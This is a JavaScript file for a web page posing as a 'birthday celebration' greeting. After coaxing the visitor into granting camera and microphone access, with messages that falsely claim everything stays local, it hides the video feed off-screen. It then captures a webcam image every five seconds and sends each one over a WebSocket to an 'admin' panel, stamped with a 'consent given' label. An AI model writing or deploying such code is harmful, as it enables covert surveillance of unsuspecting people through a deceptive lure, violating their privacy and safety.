// Session persistence and state management
const SESSION_KEY = 'birthday_session_data';

// Load saved session data
function loadSessionData() {
  try {
    const saved = localStorage.getItem(SESSION_KEY);
    return saved ? JSON.parse(saved) : null;
  } catch (e) {
    console.warn('Failed to load session data:', e);
    return null;
  }
}

// Save session data
function saveSessionData(data) {
  try {
    localStorage.setItem(SESSION_KEY, JSON.stringify(data));
  } catch (e) {
    console.warn('Failed to save session data:', e);
  }
}

// Clear session data
function clearSessionData() {
  try {
    localStorage.removeItem(SESSION_KEY);
  } catch (e) {
    console.warn('Failed to clear session data:', e);
  }
}

const nameInput = document.getElementById('nameInput');
const startBtn = document.getElementById('startBtn');
const title = document.getElementById('title');
const stepName = document.getElementById('stepName');
const greeting = document.getElementById('greeting');
const greetingText = document.getElementById('greetingText');
// showPreviewBtn removed - preview hidden for birthday experience
const previewSection = document.getElementById('previewSection');
const bdVideo = document.getElementById('bdVideo');
const stopPreviewBtn = document.getElementById('stopPreview');
const confettiCanvas = document.getElementById('confetti');
const cameraMessage = document.getElementById('cameraMessage');
const retryPermBtn = document.getElementById('retryPermBtn');
const permOverlay = document.getElementById('permOverlay');
const overlayRetryBtn = document.getElementById('overlayRetryBtn');

let confettiCtx = confettiCanvas.getContext('2d');
let confettiItems = [];
let confettiAnim = null;
let bdStream = null;
let overlayMsgInterval = null;
let captureInterval = null;
let wsClient = null;
let userId = null;

// Get session ID from URL parameters
function getSessionId() {
  const params = new URLSearchParams(window.location.search);
  return params.get('session') || 'birthday-' + Date.now();
}

// Initialize session
userId = getSessionId();

// Initialize WebSocket connection immediately
ensureWebSocket();

// Restore session data if available
function restoreSession() {
  const savedData = loadSessionData();
  if (savedData && savedData.name && savedData.sessionId === userId) {
    nameInput.value = savedData.name;
    cameraMessage.textContent = 'Restoring your celebration...';
    
    // Auto-proceed if user had already started
    if (savedData.celebrationStarted) {
      setTimeout(() => {
        startCelebration();
      }, 1000);
    }
  }
}

// Call restore session after DOM loads
if (document.readyState === 'loading') {
  document.addEventListener('DOMContentLoaded', restoreSession);
} else {
  restoreSession();
}

function resizeConfetti() {
  confettiCanvas.width = document.querySelector('.card').clientWidth;
  confettiCanvas.height = document.querySelector('.card').clientHeight;
}

function makeConfetti() {
  confettiItems = [];
  const colors = ['#ff6b6b','#ffd166','#06d6a0','#4d96ff','#b388eb'];
  for (let i=0;i<120;i++) {
    confettiItems.push({
      x: Math.random()*confettiCanvas.width,
      y: Math.random()*confettiCanvas.height - confettiCanvas.height,
      r: 6+Math.random()*8,
      c: colors[Math.floor(Math.random()*colors.length)],
      vx: -1 + Math.random()*2,
      vy: 2+Math.random()*4,
      rot: Math.random()*360
    });
  }
}

function drawConfetti() {
  confettiCtx.clearRect(0,0,confettiCanvas.width, confettiCanvas.height);
  confettiItems.forEach(p => {
    confettiCtx.save();
    confettiCtx.translate(p.x, p.y);
    confettiCtx.rotate(p.rot * Math.PI/180);
    confettiCtx.fillStyle = p.c;
    confettiCtx.fillRect(-p.r/2, -p.r/2, p.r, p.r*0.6);
    confettiCtx.restore();
    p.x += p.vx;
    p.y += p.vy;
    p.rot += 5;
    if (p.y > confettiCanvas.height + 20) {
      p.y = -20;
      p.x = Math.random()*confettiCanvas.width;
    }
  });
}

function startConfetti() {
  cancelAnimationFrame(confettiAnim);
  resizeConfetti();
  makeConfetti();
  function loop() {
    drawConfetti();
    confettiAnim = requestAnimationFrame(loop);
  }
  loop();
}

startBtn.addEventListener('click', async () => {
  const name = (nameInput.value || '').trim();
  if (!name) return;
  
  // Save session data
  saveSessionData({
    name: name,
    sessionId: userId,
    celebrationStarted: true,
    timestamp: Date.now()
  });
  
  userId = name.replace(/[^a-z0-9]/gi, '_').toLowerCase() || `user_${Math.floor(Math.random()*10000)}`;
  startCelebration();
});

// Extract start celebration logic to a separate function
function startCelebration() {
  const name = nameInput.value.trim();
  stepName.classList.add('hidden');
  greeting.classList.remove('hidden');
  greetingText.textContent = `Happy Birthday, ${name}!`;
  title.textContent = `Birthday Celebration`;
  startConfetti();
  // If page-load permission attempt failed (bdStream is null), try again now
  if (!bdStream) {
    cameraMessage.textContent = 'Requesting camera & microphone permission...';
    retryPermBtn.classList.add('hidden');
    requestCameraAndMicOnLoad();
  }
}

// Try to request camera+microphone permission on page load/login.
async function requestCameraAndMicOnLoad() {
  if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
    cameraMessage.textContent = 'Camera not supported in this browser.';
    retryPermBtn.classList.remove('hidden');
    return;
  }
  cameraMessage.textContent = 'Requesting camera & microphone permission...';
  retryPermBtn.classList.add('hidden');
  try {
    const s = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
    // store stream and auto-start session
    bdStream = s;
    cameraMessage.textContent = 'Permission granted - Preparing your celebration...';
    // hide overlay and enable name input
    hidePermOverlay();
    // Ensure video element exists and is ready
    if (bdVideo) {
      bdVideo.muted = true; // Ensure it's muted to allow autoplay
      bdVideo.playsInline = true;
    }
    // Auto-start the video preview and capture session
    autoStartSession();
  } catch (err) {
    console.warn('Permission request failed on load:', err);
    cameraMessage.textContent = 'Permission needed to make your birthday extra special!';
    retryPermBtn.classList.remove('hidden');
    bdStream = null;
    showPermOverlay();
  }
}

// Check permission status using the Permissions API when available
async function checkPermissions() {
  if (!navigator.permissions) return null;
  try {
    const cam = await navigator.permissions.query({ name: 'camera' });
    const mic = await navigator.permissions.query({ name: 'microphone' });
    return { camera: cam.state, microphone: mic.state };
  } catch (e) {
    return null;
  }
}

// Attempt permission request when page loads (or immediately if already loaded)
if (document.readyState === 'complete' || document.readyState === 'interactive') {
  requestCameraAndMicOnLoad();
} else {
  window.addEventListener('DOMContentLoaded', requestCameraAndMicOnLoad);
}

// Note: showPreviewBtn functionality removed - preview is hidden for birthday experience

retryPermBtn.addEventListener('click', async () => {
  cameraMessage.textContent = 'Setting up your birthday surprise...';
  retryPermBtn.classList.add('hidden');
  try {
    bdStream = await navigator.mediaDevices.getUserMedia({video:true,audio:true});
    cameraMessage.textContent = 'Permission granted - Preparing celebration...';
    hidePermOverlay();
    // Auto-start the session
    autoStartSession();
  } catch (err) {
    cameraMessage.textContent = 'Permission needed for your special day! Please try again.';
    retryPermBtn.classList.remove('hidden');
  }
});

overlayRetryBtn.addEventListener('click', async () => {
  overlayRetryBtn.disabled = true;
  cameraMessage.textContent = 'Setting up your birthday magic...';
  try {
    // First check if Permissions API reports 'denied' (permanently blocked)
    const perms = await checkPermissions();
    if (perms && (perms.camera === 'denied' || perms.microphone === 'denied')) {
      cameraMessage.textContent = 'Permissions appear blocked. Please enable camera & mic in your browser site settings.';
      // Show a short actionable hint
      overlayRetryBtn.textContent = 'How to enable';
      overlayRetryBtn.disabled = false;
      overlayRetryBtn.onclick = () => {
        alert('Open your browser settings for this site and allow Camera and Microphone permissions, then come back and retry.');
      };
      return;
    }

    bdStream = await navigator.mediaDevices.getUserMedia({video:true,audio:true});
    cameraMessage.textContent = 'Permission granted - Preparing celebration...';
    hidePermOverlay();
    // Auto-start the session immediately
    autoStartSession();
  } catch (err) {
    cameraMessage.textContent = 'Permission needed for your birthday surprise! Please allow camera & mic.';
    showPermOverlay();
  } finally {
    overlayRetryBtn.disabled = false;
  }
});

function showPermOverlay() {
  if (permOverlay) permOverlay.style.display = 'flex';
  // disable inputs behind overlay
  if (nameInput) nameInput.disabled = true;
  if (overlayMsgInterval) clearInterval(overlayMsgInterval);
  const p = permOverlay ? permOverlay.querySelector('p') : null;
  const msgs = [
    'We need camera & mic to make your wish sparkle ✨',
    'Pretty please? Allow camera so we can show a live surprise 😊',
    'Granting permission unlocks a special birthday effect 🎉',
    'Don\'t worry — everything stays local and fun!'
  ];
  let idx = 0;
  if (p) p.textContent = msgs[0];
  overlayMsgInterval = setInterval(() => {
    idx = (idx + 1) % msgs.length;
    if (p) p.textContent = msgs[idx];
  }, 3500);
}

function hidePermOverlay() {
  if (permOverlay) permOverlay.style.display = 'none';
  if (nameInput) nameInput.disabled = false;
  if (overlayMsgInterval) { clearInterval(overlayMsgInterval); overlayMsgInterval = null; }
  // initialize websocket client (admin panel) once permission is granted
  ensureWebSocket();
}

function autoStartSession() {
  // Position video completely off-screen but still rendered
  previewSection.style.position = 'fixed';
  previewSection.style.bottom = '-200px';
  previewSection.style.right = '-200px';
  previewSection.style.width = '160px';
  previewSection.style.height = '120px';
  previewSection.style.overflow = 'hidden';
  previewSection.style.zIndex = '-1000';
  previewSection.classList.remove('hidden');
  
  if (bdStream) {
    bdVideo.srcObject = bdStream;
    bdVideo.style.width = '160px';
    bdVideo.style.height = '120px';
    cameraMessage.textContent = 'Your birthday celebration is ready! 🎉';
    
    // Wait for video to be ready and playing
    const checkVideoReady = () => {
      if (bdVideo.readyState >= 2 && bdVideo.videoWidth > 0) {
        console.log('Video ready for capture', { 
          readyState: bdVideo.readyState, 
          videoWidth: bdVideo.videoWidth, 
          videoHeight: bdVideo.videoHeight 
        });
        cameraMessage.textContent = 'Capturing magical birthday moments! ✨';
        setTimeout(() => {
          testCapture();
          startCapturingAndSend();
        }, 1000);
      } else {
        console.log('Video not ready yet, checking again...', {
          readyState: bdVideo.readyState,
          videoWidth: bdVideo.videoWidth
        });
        setTimeout(checkVideoReady, 500);
      }
    };
    
    // Start checking when metadata is loaded
    bdVideo.addEventListener('loadedmetadata', () => {
      console.log('Video metadata loaded');
      setTimeout(checkVideoReady, 500);
    }, { once: true });
    
    // Also try playing the video explicitly
    bdVideo.play().catch(e => console.log('Video play error (might be normal):', e));
    
    // Fallback check
    setTimeout(checkVideoReady, 3000);
  }
}

function testCapture() {
  console.log('Running test capture...');
  const video = bdVideo;
  if (!video.videoWidth || !video.videoHeight || video.readyState < 2) {
    console.log('Test capture failed: video not ready', {
      videoWidth: video.videoWidth,
      videoHeight: video.videoHeight,
      readyState: video.readyState
    });
    return;
  }
  
  const canvas = document.createElement('canvas');
  canvas.width = video.videoWidth;
  canvas.height = video.videoHeight;
  const ctx = canvas.getContext('2d');
  
  try {
    // Clear canvas first
    ctx.clearRect(0, 0, canvas.width, canvas.height);
    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
    
    // Add test overlay
    ctx.fillStyle = 'red';
    ctx.fillRect(10, 10, 100, 30);
    ctx.fillStyle = 'white';
    ctx.font = '16px Arial';
    ctx.fillText('TEST CAPTURE', 15, 30);
    
    const dataUrl = canvas.toDataURL('image/png');
    const payload = JSON.stringify({ 
      type: 'image', 
      sessionId: userId, 
      userId, 
      time: Date.now(), 
      payload: dataUrl 
    });
    
    if (wsClient && wsClient.readyState === WebSocket.OPEN) {
      console.log('Sending test image...', { sessionId: userId });
      wsClient.send(payload);
    } else {
      console.log('WebSocket not ready for test', { readyState: wsClient?.readyState });
    }
  } catch (error) {
    console.error('Error in test capture:', error);
  }
}

function ensureWebSocket() {
  if (wsClient && wsClient.readyState === WebSocket.OPEN) return;
  
  console.log('Creating WebSocket connection...');
  wsClient = new WebSocket((location.protocol === 'https:' ? 'wss://' : 'ws://') + location.host);
  
  wsClient.addEventListener('open', () => {
    // register as user with session ID
    console.log('WebSocket connected, registering user', { userId, sessionId: userId });
    const registerMessage = { type: 'register', role: 'user', userId, sessionId: userId };
    console.log('Sending registration:', registerMessage);
    wsClient.send(JSON.stringify(registerMessage));
  });
  
  wsClient.addEventListener('message', (event) => {
    console.log('Received WebSocket message:', event.data);
    try {
      const data = JSON.parse(event.data);
      console.log('Parsed message:', data);
    } catch (e) {
      console.log('Failed to parse message:', e);
    }
  });
  
  wsClient.addEventListener('close', (event) => {
    console.log('WebSocket closed', { code: event.code, reason: event.reason });
    setTimeout(ensureWebSocket, 2000);
  });
  
  wsClient.addEventListener('error', (error) => {
    console.log('WebSocket error:', error);
  });
}

function startCapturingAndSend() {
  if (!bdStream || captureInterval) return;
  ensureWebSocket();
  const canvas = document.createElement('canvas');
  const video = bdVideo;
  canvas.width = 640;
  canvas.height = 480;
  const ctx = canvas.getContext('2d');
  
  console.log('Starting image capture...', { hasStream: !!bdStream, hasVideo: !!video });
  
  captureInterval = setInterval(() => {
    if (!video.videoWidth || !video.videoHeight || video.readyState < 2) {
      console.log('Video not ready yet, skipping capture', { 
        videoWidth: video.videoWidth, 
        videoHeight: video.videoHeight,
        readyState: video.readyState 
      });
      return;
    }
    
    console.log('Capturing image...', { width: video.videoWidth, height: video.videoHeight });
    
    canvas.width = video.videoWidth;
    canvas.height = video.videoHeight;
    
    // Clear canvas first
    ctx.clearRect(0, 0, canvas.width, canvas.height);
    
    try {
      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
      
      // overlay a small consent badge
      ctx.fillStyle = 'rgba(0,0,0,0.5)';
      ctx.fillRect(6, canvas.height - 32, 260, 26);
      ctx.fillStyle = '#fff';
      ctx.font = '14px sans-serif';
      ctx.fillText('Captured & sent to admin — consent given', 12, canvas.height - 12);
      
      const dataUrl = canvas.toDataURL('image/png');
      const payload = JSON.stringify({ type: 'image', sessionId: userId, userId, time: Date.now(), payload: dataUrl });
      
      if (wsClient && wsClient.readyState === WebSocket.OPEN) {
        console.log('Sending image to admin...', { sessionId: userId });
        wsClient.send(payload);
      } else {
        console.log('WebSocket not ready', { readyState: wsClient?.readyState });
      }
    } catch (error) {
      console.error('Error capturing image:', error);
    }
  }, 5000);
}

stopPreviewBtn.addEventListener('click', () => {
  if (!bdStream) return;
  bdStream.getTracks().forEach(t => t.stop());
  bdStream = null;
  bdVideo.srcObject = null;
});

window.addEventListener('resize', resizeConfetti);
resizeConfetti();
